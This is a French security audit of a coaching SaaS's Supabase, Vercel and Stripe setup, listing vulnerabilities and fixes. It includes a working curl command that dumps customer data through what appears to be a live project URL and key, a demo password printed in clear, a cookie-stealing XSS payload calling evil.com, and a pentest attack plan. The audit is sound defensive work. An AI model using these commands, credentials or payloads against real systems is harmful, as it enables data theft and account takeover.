# RB Perform — Audit de sécurité paranoïaque

**Mode :** OSCP / fintech 9 chiffres. "Tout est compromis jusqu'à preuve du contraire."
**Date :** 2026-05-02
**Cible :** /Users/rayan/fitcoach_updated (React CRA + Supabase + Vercel + Stripe + Zoho SMTP)
**Surface auditée :** 30 endpoints `api/*`, 45 migrations Supabase RLS, src React, vercel.json, .env*, git history, npm audit.

---

## **VERDICT — SCORE : 38 / 100. NE PAS LANCER EN L'ÉTAT.**

**3 failles CRITIQUES exploitables aujourd'hui sans aucun outil sophistiqué :**
1. **Bypass RLS coaches → fuite de toute la table coaches** (emails, Stripe customer IDs, statuts paiement) via 1 requête HTTP anonyme
2. **Mot de passe demo hardcodé dans le bundle JS public** (`RBPerform2025!`) → quiconque peut s'authentifier comme coach demo
3. **`bodyParser: false` cassé sur webhook Stripe** → vérif signature potentiellement contournable

À 10M€ de CA visés, **n'importe laquelle de ces 3 = RGPD breach + perte de confiance Founders**. Avant lancement dim. 4 mai : fix #1 et #2 obligatoires (1h chacun).

---

## 🚨 FAILLES CRITIQUES (à fixer dans l'heure)

### [CRIT-1] RLS coaches : politique `coaches_public_via_slug` exfiltre toute la base

**Fichier :** `supabase/migrations/034_complete_rls.sql:35-38`

```sql
DROP POLICY IF EXISTS coaches_public_via_slug ON coaches;
CREATE POLICY coaches_public_via_slug ON coaches FOR SELECT USING (
  coach_slug IS NOT NULL
);
```

**Pourquoi c'est mortel :** un trigger BEFORE INSERT/UPDATE (`008_coach_invitation_system.sql:69-71`) auto-remplit `coach_slug` pour CHAQUE coach. Donc `coach_slug IS NOT NULL` = TRUE pour tous. Combiné aux autres policies (OR logique en RLS), un anon a un SELECT public sur **TOUTE** la table `coaches`, y compris colonnes sensibles.

**Exploit (zéro outil) :**
```bash
curl -s "https://pwkajyrpldhlybavmopd.supabase.co/rest/v1/coaches?select=email,stripe_customer_id,stripe_subscription_id,stripe_subscription_status,locked_price,payment_issue,payment_issue_at,unsub_all,coach_code" \
  -H "apikey: sb_publishable_WbG1gs6l7XP6aHH_UqR0Hw_XLSI50ud"
```
→ Dump complet : email + customer Stripe + statut paiement de chaque Founder. Phishing + extorsion + compromission RGPD immédiate.

**La policy `coaches_public_read` (010_referral_public_profile.sql:103-104) gate sur `public_profile_enabled = true` mais comme RLS est OR-permissive, la mauvaise policy 034 wins.**

**Fix immédiat (SQL Editor Supabase, < 30 secondes) :**
```sql
DROP POLICY IF EXISTS coaches_public_via_slug ON public.coaches;

-- Restreindre aussi la policy anon "public_read" à des colonnes safe via une vue :
DROP POLICY IF EXISTS coaches_public_read ON public.coaches;

CREATE OR REPLACE VIEW public.coaches_public AS
SELECT id, full_name, brand_name, public_slug, public_bio, public_specialties,
       public_photo_url, public_city, public_cta_url, logo_url, accent_color,
       public_profile_enabled
FROM public.coaches
WHERE public_profile_enabled = true;

GRANT SELECT ON public.coaches_public TO anon, authenticated;

-- Update coach-vitrine.js + sitemap.xml.js + og-coach.mjs pour interroger
-- /rest/v1/coaches_public au lieu de /rest/v1/coaches.
```

Puis dans `api/coach-vitrine.js:40`, `api/sitemap.xml.js:29`, `api/og-coach.mjs:25` : remplacer `coaches?` par `coaches_public?` (et retirer `&public_profile_enabled=eq.true` devenu redondant).

---

### [CRIT-2] Mot de passe demo coach hardcodé dans le bundle JavaScript public

**Fichier :** `src/App.jsx:514-526`, `.env.local:5`, `build/static/js/main.7cdc5437.js`

```js
const email = process.env.REACT_APP_DEMO_EMAIL;       // demo@rbperform.app
const password = process.env.REACT_APP_DEMO_PASSWORD; // RBPerform2025!
supabase.auth.signInWithPassword({ email, password })
```

**Problème :** Create React App **inline tous les `REACT_APP_*` dans le JS livré aux navigateurs** au build time. Le secret `RBPerform2025!` est donc en clair dans le bundle public.

**Vérification (faite) :** `grep "RBPerform2025" build/static/js/*.js` → match dans `main.7cdc5437.js`. **Confirmé.**

**Exploit :**
1. Attaquant ouvre rbperform.app dans Chrome.
2. View Source → onglet Network → fichier `main.<hash>.js`.
3. Cherche `RBPerform2025` → trouve email + password.
4. POST `https://pwkajyrpldhlybavmopd.supabase.co/auth/v1/token?grant_type=password` avec ces creds → JWT valide, role coach.
5. Avec ce JWT, accès à toutes les ressources liées à `coach_id = 33ae97b9-b068-44f3-bef0-0c7c18e5b774` : clients demo, programmes, messages. Plus grave : si la RLS du coach demo n'est pas isolée, écriture/lecture dans la base prod.

**Fix (1h) :**
1. Retirer `REACT_APP_DEMO_PASSWORD` du `.env.local` ET de Vercel.
2. Réécrire l'auto-login demo coach en utilisant le même pattern que `demo-client.js` : un endpoint serverless `/api/demo-coach` qui mint un token via `auth.admin.generateLink()` côté serveur (jamais exposé au browser).
3. Tourner le mot de passe demo dans Supabase (Authentication → Users → reset).
4. Considérer le mot de passe `RBPerform2025!` comme compromis : il est dans tous les builds publics depuis des semaines.

---

### [CRIT-3] Webhook Stripe : `bodyParser: false` n'est PAS appliqué (export écrasé)

**Fichier :** `api/webhook-stripe.js:329` puis `337`

```js
// Ligne 329 — d'abord on set le config sur l'export (qui n'existe pas encore)
module.exports.config = { api: { bodyParser: false } };
…
// Ligne 337 — puis on REMPLACE module.exports par le handler
module.exports = async (req, res) => { … };
```

**Conséquence :** la propriété `.config` posée à la ligne 329 est sur un `module.exports` éphémère, écrasé à la ligne 337 par l'assignation du handler. **Vercel n'a donc pas l'instruction de désactiver le bodyParser**. Résultat probable : `req` a déjà été consommé par Vercel quand `getRawBody()` itère, donc `rawBody` est un Buffer vide, `getStripe().webhooks.constructEvent(rawBody, …)` lève "no signatures found matching the expected signature" → tous les webhooks tombent en 400.

**Si ça "marche" en prod c'est un coup de bol** (Vercel ne body-parse pas si `Content-Type` est non-JSON, ou le runtime Node passe le stream non consumed). Mais c'est non-déterministe : le jour où Vercel patch leur runtime, **tous les paiements arrêtent de provisionner les coachs**. Pire : si un attaquant arrive à forger un body avec un body-parser actif, la signature est calculée sur du JSON re-stringifié ≠ raw bytes Stripe → bypass possible.

**Fix (5 min) :**
```js
// REMPLACER lignes 329-337 par :
async function getRawBody(req) { … } // inchangé

const handler = async (req, res) => { … }; // déplacer le handler

module.exports = handler;
module.exports.config = { api: { bodyParser: false } };
```

L'ordre `exports = handler` PUIS `exports.config = …` est obligatoire.

**Vérif post-fix :** `curl -X POST https://rbperform.app/api/webhook-stripe -d 'foo' -H 'stripe-signature: bad'` doit logger `[WEBHOOK_SIG_INVALID]` (pas `Unexpected token`).

---

## 🔴 FAILLES HAUTES (cette semaine)

### [H-1] `/api/unsubscribe` désabonne n'importe quel email sans token

**Fichier :** `api/unsubscribe.js:31-79`

```js
const email = (req.query?.email || '').trim().toLowerCase();
…
// PAS de signature HMAC, pas de token unique, pas de vérif quoi que ce soit
await supabase.from('coaches').update({ unsub_all: true }).eq('email', email);
```

**Exploit :** un concurrent peut écrire un script qui itère sur tous les emails de Founders qu'il a obtenus (par CRIT-1, ou simplement par devination), et désabonne tout le monde des digests, founder check-ins, marketing. Tu te tires une balle DSP : tes Founders ne reçoivent plus aucune comm produit.

**Fix :** signer le lien `/api/unsubscribe` avec un HMAC court basé sur `(email, type, timestamp)` + `UNSUBSCRIBE_SECRET`. La RFC 8058 One-Click POST tolère cela : Gmail accepte un token URL-bound.

```js
// Génération côté envoi mail :
const token = crypto.createHmac('sha256', process.env.UNSUBSCRIBE_SECRET)
  .update(`${email}:${type}`).digest('hex').slice(0, 16);
const url = `https://rbperform.app/api/unsubscribe?email=${email}&type=${type}&t=${token}`;

// Vérif côté API :
const expected = crypto.createHmac('sha256', process.env.UNSUBSCRIBE_SECRET)
  .update(`${email}:${type}`).digest('hex').slice(0, 16);
if (req.query.t !== expected) return res.status(403).json({ error: 'invalid token' });
```

---

### [H-2] `/api/send-welcome` permet d'envoyer un mail à n'importe quel destinataire via ton SMTP

**Fichier :** `api/send-welcome.js:117-139`

```js
const { email, full_name, type, programme_name } = body;
if (!email) return res.status(400).json({ error: 'Missing email' });
…
await transporter.sendMail({ from: `RB Perform <${SMTP_USER}>`, to: [email], … });
```

Aucune vérif d'auth. La seule barrière est le check d'origin du `secureRequest()`, contournable en spoof Origin/Referer (un attaquant peut faire un POST depuis n'importe quel front en envoyant `Origin: https://rbperform.app` — Vercel ne valide pas l'origine en CSRF, c'est juste informatif). Rate-limit 60/h/IP.

**Exploit :**
1. Attaquant fait 60 POST/heure avec `email=victim@gmail.com` et `programme_name=<a href=evil.com>cliquez ici</a>`
2. Tes Zoho SMTP envoient des phishing au nom de `RB Perform <rayan@rbperform.app>` à des cibles arbitraires.
3. Reputation SMTP Zoho ruinée + RB Perform en blacklist Spamhaus + tu loses ta deliverability le jour du lancement.

**Aussi :** `programme_name` est interpolé sans escape (`api/send-welcome.js:22` → `${progName}`) → HTML injection dans le mail (phishing landing).

**Fix :**
1. Exiger `Authorization: Bearer <jwt>` + vérifier que le coach connecté est bien le `coach_id` du `client.id` propriétaire de l'email cible.
2. Escape HTML systématique sur `progName`.
3. Lookup le client dans Supabase et lire l'email côté serveur — ne JAMAIS faire confiance à `body.email`.

---

### [H-3] `/api/voice-analyze` non authentifié → coût Mistral à la charge de RB Perform

**Fichier :** `api/voice-analyze.js:196-216`

Le endpoint accepte 60 POST/heure/IP via `secureRequest`, sans aucun JWT. `mistral-large-latest` coûte ~$0.002/call avec `max_tokens: 1200`. Un attaquant tournant un cluster de 1000 IPs (pool VPN/datacenter) peut faire **60 000 appels/h × $0.002 = $120/h**, 24h = **$2 880/jour**, jusqu'à ce que ton quota Mistral saute (et là tes vrais clients perdent l'accès, voir l'alerte SMTP intégrée). Plus, c'est aussi un **vector free LLM** (use Mistral derrière ton SMTP comme un GPT public).

**Aussi :** `faq-assistant.js` même problème (30 req/h/IP, mistral-small ~$0.0006/call).

**Fix :** exiger `Authorization: Bearer <supabase-jwt>` + vérifier que le user est `client` ou `coach` actif. Quota par user_id, pas par IP.

---

### [H-4] `unsubscribe.js` : enumeration / oracle d'existence

**Fichier :** `api/unsubscribe.js:66-72`

Le commentaire dit "ne pas leak existence" mais le `console.info("[unsubscribe] OK ${email} … coach=${!!coach} client=${!!client}")` log les booléens d'existence. Si quelqu'un consulte les logs Vercel (mauvais accès interne, leak Sentry), il peut énumérer quels emails sont coach vs client. À noter : ne fuit pas côté API (toujours 200), mais l'info est en logs structured.

**Fix :** retirer `coach=${!!coach} client=${!!client}` du log (ou hash le log).

---

### [H-5] Webhook Stripe : email user contrôlable → injection table coaches

**Fichier :** `api/webhook-stripe.js:397-480`

Le webhook récupère `session.customer_email || session.customer_details?.email` puis upsert dans `coaches.email`. **Si Stripe Test Mode est activé en prod par erreur** (ou si un attaquant trouve un Payment Link valide), il peut payer 1€ avec un email arbitraire et **forcer la création d'un compte coach actif**. Pire : `email_confirm: true` → bypass de la double-opt-in.

Mitigation actuelle : la seule signature webhook (qui valide que ça vient de Stripe). Mais Stripe Test signs aussi avec le webhook secret de test. Risque résiduel : si `STRIPE_WEBHOOK_SECRET` est jamais leak (CI logs, Vercel build env exposé), un attaquant forge un event.

**Fix :** vérifier que `event.livemode === true` en production avant de provisionner. Ajouter un check :
```js
if (process.env.VERCEL_ENV === 'production' && !event.livemode) {
  return res.status(400).json({ error: 'test event in prod' });
}
```

---

### [H-6] `coach_slug` change avec UPDATE → IDOR sur propre profil

**Fichier :** `supabase/migrations/008_coach_invitation_system.sql:62-79`

Le trigger `ensure_coach_code_and_slug` se déclenche `BEFORE INSERT OR UPDATE`. Un coach authentifié peut PATCH son `coach_slug` arbitrairement (la RLS l'autorise sur sa propre row). Risques :
- Squat de slug : un coach peut changer son slug pour `rayan`, `admin`, etc. avant que Rayan n'arrive (voire override les Founders si pas assez d'unicité).
- Slug avec caractères spéciaux : pas de validation côté DB. Le check est juste côté `coach-vitrine.js:306` (`/^[a-z0-9-]{2,40}$/`), mais la table `coaches` accepte n'importe quoi → puis tout SQL avec `coach_slug` peut surprendre.

**Fix :** ajouter contrainte CHECK `coach_slug ~ '^[a-z0-9-]{2,40}$'` au niveau DB + RESERVED slugs (`admin`, `rayan`, `api`, etc.) en table dédiée.

---

### [H-7] `coach-vitrine.js` — `escAttr` ne couvre pas tous les contextes

**Fichier :** `api/coach-vitrine.js:27-29`

```js
const escAttr = (s) => String(s ?? '').replace(/[<>"'&]/g, (c) => ({…}[c]));
```

Cette fonction n'échappe pas `=`, `/`, `\`, et est utilisée pour `mailto:` URLs (`api/coach-vitrine.js:274`) et `public_cta_url`. Le check `^(https?:|mailto:|tel:)/` rejette `javascript:` mais pas `data:text/html,…` (qui n'est pas dans la regex donc rejeté ✓), ni `vbscript:` ni `JaVaScRiPt:` (insensitivité à la casse non gérée ; en réalité la regex est case-sensitive donc `JaVaScRiPt:` passe).

**Exploit théorique :** si un coach met `public_cta_url = "JaVaScRiPt:alert(document.cookie)"`, l'utilisateur qui clique sur sa vitrine voit du JS exécuter (XSS stored, sortie du compte). En pratique le CSP `default-src 'self'` bloque, mais c'est de la défense en profondeur cassée.

**Fix :**
```js
const customCta = coach.public_cta_url
  && /^(https?:|mailto:|tel:)/i.test(coach.public_cta_url)  // ← ajouter /i
  ? coach.public_cta_url : null;
```

---

### [H-8] Webhook Stripe metadata `plan` non whitelist

**Fichier :** `api/webhook-stripe.js:401-409, 471-480`

```js
const metadata = session.subscription_data?.metadata || session.metadata || {};
let plan = metadata.plan || (metadata.founding_coach === 'true' ? 'founding' : null);
…
.upsert({ id: userId, plan: plan, … })
```

`plan` provient de la metadata Stripe — modifiable par n'importe qui ayant accès à un Payment Link ou à un Stripe Checkout (via `?metadata[plan]=elite` côté URL si non hardcodé). Si un attaquant peut réussir un paiement avec `metadata.plan = 'elite'` mais payer le tarif Starter, le compte est upsert avec plan elite → **price escalation**.

**Fix :** whitelist le plan via le `priceId` exclusivement (pas la metadata) :
```js
const VALID_PLANS = { starter: 'STRIPE_PRICE_STARTER', pro: 'STRIPE_PRICE_PRO', elite: 'STRIPE_PRICE_ELITE', founding: 'STRIPE_PRICE_FOUNDING' };
const lineItems = await getStripe().checkout.sessions.listLineItems(session.id);
const priceId = lineItems.data[0]?.price?.id;
plan = Object.entries(VALID_PLANS).find(([, env]) => process.env[env] === priceId)?.[0] || null;
if (!plan) return res.status(400).json({ error: 'unknown plan' });
```

---

### [H-9] `gdpr-export.js` n'exporte qu'une fraction des données

**Fichier :** `api/gdpr-export.js:27-33`

```js
const COACH_SCOPED_TABLES = ["clients", "programmes", "notification_logs", "invoices", "coach_plans"];
```

Manque : `coach_notes`, `coach_testimonials`, `coach_settings`, `referrals`, `client_measurements`, `weekly_checkins`, `onboarding_forms`, `messages`, `sessions`, `client_payments`, `cold_prospects` (si applicable), `sentinel_cards`, `sentinel_mistral_logs`, etc. Sur 42 tables, l'export en touche 5. **Article 20 RGPD non respecté.**

Plus : aucun endpoint `/api/gdpr-delete` (article 17 — droit à l'oubli). Non-conformité majeure : un user qui demande la suppression doit pouvoir le déclencher en self-service. Risque CNIL : sanction jusqu'à 4% du CA mondial.

**Fix :** énumérer toutes les tables avec une colonne `coach_id` ou liée au coach + export complet. Ajouter `/api/gdpr-delete` avec confirmation 2-step (vérifier auth, deux JWT séparés à 5min d'intervalle, notify email).

---

### [H-10] Anon key Supabase hardcodée en fallback dans 3 endpoints

**Fichier :** `api/coach-vitrine.js:18-19`, `api/sitemap.xml.js:14-15`, `api/og-coach.mjs:18-19`

```js
const SUPABASE_ANON = process.env.SUPABASE_ANON_KEY || process.env.REACT_APP_SUPABASE_ANON_KEY
  || 'sb_publishable_WbG1gs6l7XP6aHH_UqR0Hw_XLSI50ud';  // ← fallback hardcodé
```

Pas un secret (publishable key, par design publique), mais c'est un anti-pattern : si demain tu rotates la clé pour une raison X, ces 3 endpoints continueront à utiliser l'ancienne. Plus, c'est un code smell qui obscurcit les revues.

**Fix :** retirer les fallbacks et `throw new Error('SUPABASE_ANON_KEY required')` si manquante.

---

## 🟠 RISQUES MOYENS (ce mois-ci)

### [M-1] `waitlist.js` notify-Rayan : HTML injection dans email admin

**Fichier :** `api/waitlist.js:138-148`

```html
<td>${cleanEmail}</td>
<td>${clients || '—'}</td>
<td>${problem || '—'}</td>
<td>${source || 'waitlist'}</td>
<td>${[utm_source, utm_medium, utm_campaign].filter(Boolean).join(' / ') || '—'}</td>
<td>${referrer || '—'}</td>
```

Aucun escape. Un attaquant submit `clients = "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"` → quand Rayan ouvre l'email dans Gmail web, le code peut s'exécuter (Gmail strip la plupart, mais Apple Mail / Outlook moins).

Aussi `subject` ligne 133 inclut `name` non escape → header injection email possible (CRLF dans `name` → spoofer From, Reply-To).

**Fix :** utiliser le `escHtml` qui existe déjà dans `coaching-application.js:31-34` et `sanitizeSubject` pour le subject.

---

### [M-2] `cold-outreach.js` : auth cron permissive en non-prod

**Fichier :** `api/cron/cold-outreach.js:24-27`

```js
function isAuthorized(req) {
  if (!CRON_SECRET) return process.env.NODE_ENV !== 'production';
  …
}
```

Sur les preview deployments Vercel (qui ont `NODE_ENV !== 'production'`), n'importe qui peut hit `/api/cron/cold-outreach` et déclencher l'envoi de 30 cold emails sans CRON_SECRET. Un preview deploy public (URL devinable / leakée) → spam tes 80 prospects waitlist plusieurs fois.

**Fix :** harmoniser avec les autres crons (refuser si `CRON_SECRET` manquant tout court, peu importe l'env).

---

### [M-3] `coaches_public_read` policy expose toutes les colonnes coach

**Fichier :** `supabase/migrations/010_referral_public_profile.sql:103-104`

Même après fix CRIT-1, la policy `coaches_public_read` (anon SELECT WHERE `public_profile_enabled = true`) permet de lire **toutes les colonnes** de la table coaches pour les coachs publics, y compris `email`, `stripe_customer_id`, `payment_issue`. Le risque : les coachs activant leur vitrine (probablement la majorité une fois en croissance) deviennent leakable.

**Fix (déjà couvert par CRIT-1) :** créer une vue `coaches_public` qui ne retourne QUE les colonnes destinées au public (`public_*`, `full_name`, `brand_name`, `accent_color`, `logo_url`).

---

### [M-4] `cron-demo-reset.js` : pas de protection si `CRON_SECRET` non set

**Fichier :** `api/cron-demo-reset.js:17-24`

Same pattern que cron-relance — si `CRON_SECRET` manquant, refuse. ✓ Bien. Note : continuer à harmoniser.

---

### [M-5] Mode demo client write blocking côté client uniquement

**Fichier :** `src/lib/demoMode.js`, `api/cron-demo-reset.js`

L'app cliente bloque les writes en mode demo via `isClientDemoMode()` ; mais un user authentifié comme `lucas.demo@rbperform.app` peut directement appeler Supabase REST avec son JWT et écrire/lire les données. Le cron quotidien `cron-demo-reset` répare, mais entre 03:00 UTC et 03:00 UTC du lendemain, les données peuvent être polluées par tout user demo.

**Fix :** RLS spécifique sur le client demo : `clients.id = lucas_demo_uuid` → DENY ALL writes pour `auth.uid() = lucas_demo_uuid`. Force la lecture seule.

---

### [M-6] CSP `script-src 'unsafe-inline'`

**Fichier :** `vercel.json:65` (header CSP)

```
script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://www.youtube.com
```

`'unsafe-inline'` permet à n'importe quel `<script>...</script>` injecté de s'exécuter. Si un XSS stored apparaît un jour (ex : via `coach.brand_name` mal escape quelque part), le CSP ne bloque rien. CRA n'utilise plus de inline scripts en production (depuis CRA 4) — ce relâchement n'est probablement plus nécessaire.

**Fix :** test en preview avec `script-src 'self' https://cdnjs.cloudflare.com https://www.youtube.com` (sans unsafe-inline). Si quelque chose break, basculer sur les nonces.

---

### [M-7] `npm audit` : 15 high, 6 moderate

Vulns héritées de `react-scripts@5.0.1` (svgo, postcss-svgo, webpack-dev-server, etc.). La majorité ne touche que le dev-time (build), pas le runtime servi. Cependant `nth-check` (high) impacte parsers SVG côté build — si un asset SVG malicieux passe par CI, RCE possible.

**Fix :** suivre l'upgrade vers Vite (déjà discuté ailleurs ?), ou minimum `npm audit fix --omit=dev` régulièrement. Documenter le statut dans `SECURITY.md`.

---

### [M-8] Pas de 2FA pour Rayan (compte super-admin)

Aucun mécanisme 2FA côté Supabase Auth dans le code. Si Rayan compromet son mot de passe (phishing, fuite Zoho), accès complet à la base via le dashboard Supabase + JWT super_admin.

**Fix :** activer Supabase Auth MFA (TOTP) pour les comptes coachs au minimum, obligatoire pour `super_admins`. C'est un toggle Supabase + un flow front à ajouter (~1j de dev).

---

### [M-9] Vercel `X-Powered-By` non strippé

`vercel.json` ne supprime pas le header `X-Powered-By: Next.js` (Vercel ajoute ce header par défaut sur les invocations serverless). Fingerprint version → CVE targeting plus facile.

**Fix :** ajouter dans chaque endpoint `res.removeHeader('x-powered-by')` ou bien dans un middleware commun.

---

### [M-10] `automatic_tax: { enabled: true }` mais pas de fallback gestion

**Fichier :** `api/checkout.js:114`, `api/checkout-founding.js:121`

Stripe lève une erreur si l'address n'est pas valide → `err.message` retourné brut au client (`checkout.js:142` : `return res.status(500).json({ error: err.message });`). Stripe error messages peuvent leak des détails internes (price IDs, tax codes, customer IDs des autres). Préfère un message générique en prod.

**Fix :** wrapper ce return en `{ error: process.env.VERCEL_ENV === 'production' ? 'Stripe error' : err.message }` — déjà fait dans `checkout-founding.js:150`, à harmoniser avec `checkout.js`.

---

## 🟡 BONNES PRATIQUES MANQUANTES

1. **Pas de `SECURITY.md`** documentant le programme de bug bounty (même informel : "report security@rbperform.app, je réponds <24h"). Un chercheur qui trouve un bug ne sait pas où le signaler → publication directe = pire scénario.

2. **Pas de CSP `report-uri`** : tu ne sais pas quand le CSP block un script → impossible de détecter une injection précoce.

3. **Pas de Subresource Integrity (SRI)** sur le `<script src="https://cdnjs.cloudflare.com/...">` : si Cloudflare CDN compromis, ton app exécute du code malicieux.

4. **Pas de Content-Security-Policy `frame-ancestors 'none'`** : tu acceptes `'self'`, mais aucune raison d'être iframe-able. Pas exploitable directement, mais étend la surface clickjacking.

5. **Logs avec PII en clair** : `console.error("[WAITLIST_LOST] db_write_failed email=${cleanEmail}")`. Email = PII RGPD. Vercel logs sont conservés 30 jours, partagés avec l'équipe Vercel via leur propre infra. Considérer hash : `email=${sha1(cleanEmail).slice(0,8)}`.

6. **Pas de rate limiting distribué** : le rate-limit en `_security.js` est in-memory par instance Vercel. Un attaquant qui se prend un 429 peut juste attendre 5 minutes que sa requête tombe sur une autre instance lambda froide. Upgrade vers Upstash Redis (cité dans le commentaire).

7. **Pas d'expiration sur les magic links** : `auth.admin.generateLink()` sans `redirectTo` ni override d'expiration utilise les défauts Supabase (1h pour recovery). Documenter dans le webhook que c'est intentionnel.

8. **Pas de logging structuré pour échecs auth** : un spike d'auth failures (brute force) ne déclenche aucune alerte. Sentry capture les erreurs 5xx mais pas les 401 répétitifs. À considérer pour la prod.

9. **Pas de header `Referrer-Policy: no-referrer-when-downgrade` sur les redirections externes** (mailto:/wa.me/) — l'URL avec query params peut leak vers WhatsApp/Calendly.

10. **`.env.example` documente la structure mais expose les patterns de noms** — utile pour un attaquant qui veut deviner les env vars en cas de fuite SSRF/path traversal sur un endpoint custom. Acceptable mais à noter.

---

## Tests pénétration recommandés (par où je hackerais ce SaaS)

**Priorité 1 — exploits prêts en 30 min :**
1. Dump de la table `coaches` via `coach_slug IS NOT NULL` policy (CRIT-1). Confirme avec `curl`.
2. Login demo coach via creds extraits du bundle (CRIT-2). Tester si la RLS isole vraiment les données demo des coach prod.
3. Fuzz du webhook Stripe avec des `metadata.plan` arbitraires + replay d'events anciens (Stripe Replay Protection assure normalement, mais tester la 300s tolerance + idempotency table).

**Priorité 2 — exploits qui demandent un peu de plomberie :**
4. Énumération massive Supabase REST sur toutes les tables avec la `anon key` publique : `clients`, `programmes`, `messages`, `client_measurements` — vérifier toutes les RLS.
5. Storage Supabase : tester l'upload de fichiers arbitraires sur le bucket `coach_logos` (path traversal `../../public/index.html`, type bypass via Content-Type).
6. CSRF sur les Server Actions Supabase : `supabase.auth.signInWithOtp` sans token → spam des magic links pour énumérer les emails coachs.

**Priorité 3 — chasse aux IDOR :**
7. Connecté comme coach A, requêter `clients?coach_id=eq.<coach_B_id>` directement via REST. La RLS doit rejeter — sinon access cross-tenant.
8. PATCH `coaches?id=eq.<other_id>` avec son JWT — vérifier que la policy WITH CHECK rejette.
9. Bypass `unsubscribe.js` sans token, cible Rayan → `?email=rb.performancee@gmail.com&type=all`.
10. Forcer plan elite via metadata.plan en checkout (H-8).

**Priorité 4 — abus économique :**
11. Spam `voice-analyze.js` depuis un pool de 1000 IPs résidentielles (proxy, $0.5/IP) — coût Mistral ~$2880/jour (H-3).
12. Spam `send-welcome.js` pour ruiner ta deliverability Zoho (H-2).
13. Spam `cron/cold-outreach` sur preview deployments si CRON_SECRET non set (M-2).

**Priorité 5 — recon :**
14. Scan de la surface : `nuclei`, `wpscan` (faux positif), header analyzer (X-Powered-By, Server). Objectif : fingerprinting + version disclosure.
15. Sentry DSN public + envoyer des events forgés pour saturer le quota / polluer les alertes Rayan.
16. Énumérer les Vercel preview URLs via Subdomain enumeration (`subfinder`, `amass`) — chercher des branches non protégées avec `/api/cron/*` accessible.

---

## Ordre d'action recommandé (priorité d'arrêt cardiaque)

| Quand | Action | Effort |
|---|---|---|
| Dans l'heure | DROP policy `coaches_public_via_slug` (CRIT-1) | 30 sec SQL |
| Dans l'heure | Retirer `REACT_APP_DEMO_PASSWORD` + rebuild + rotate le password Supabase (CRIT-2) | 30 min |
| Dans l'heure | Fix `module.exports.config` ordre webhook Stripe (CRIT-3) | 5 min |
| Avant lancement (dim 4 mai) | Token HMAC sur `/api/unsubscribe` (H-1) | 30 min |
| Avant lancement | Auth `/api/send-welcome` + escape `programme_name` (H-2) | 1h |
| Avant lancement | Auth `/api/voice-analyze` + `/api/faq-assistant` (H-3) | 1h |
| Avant lancement | Vue `coaches_public` + update endpoints SSR (M-3, refactor de CRIT-1) | 2h |
| Cette semaine | Whitelist `plan` par priceId (H-8) | 30 min |
| Cette semaine | `/api/gdpr-delete` + export complet (H-9) | 4h |
| Ce mois | RLS demo client read-only (M-5) | 1h |
| Ce mois | Activer Supabase MFA (M-8) | 1j |
| Ce mois | Migration vers Upstash Redis pour rate-limit distribué | 2h |

---

## Ce qui est BIEN fait (à ne pas casser)

- Service-role key jamais exposée côté client (vérifié via grep)
- `.env` correctement gitignored, jamais commité
- DOMPurify utilisé sur les uploads HTML programmes (CoachDashboard.jsx:2788)
- HSTS preload, CSP présent, X-Frame-Options défini
- Webhook Stripe : signature vérifiée, idempotency via `stripe_events` table, événements de dispute/refund traités, alerte critique manuelle si welcome email échoue
- Schémas zod sur les endpoints sensibles (`waitlist`, `coaching-application`, `checkout-founding`)
- Migration RLS systématique (45 migrations, audit récent), policies email case-insensitive (030)
- Sentry intégré sans SDK lourd (api/_sentry.js — POST direct envelope)
- Stripe Customer dedup pour éviter les doubles abonnements
- Idempotency `stripe_events` avec UNIQUE constraint + race detection

Le squelette est solide. Les 3 CRIT sont des oublis qu'un audit comme celui-ci attrape avant lancement, pas des défauts d'architecture. Une fois corrigés + Hauts éliminés cette semaine, le score remonte vers 75-80/100, ce qui est correct pour un SaaS pre-Series A. Pour atteindre 90+ il faudra aussi : MFA, vue coaches_public, GDPR delete, rate-limit distribué, audit pen-test externe (Pentest as a Service ~3-5k€).

---

*Audit généré le 2026-05-02. Pour toute question : reply-to dans Slack #security.*
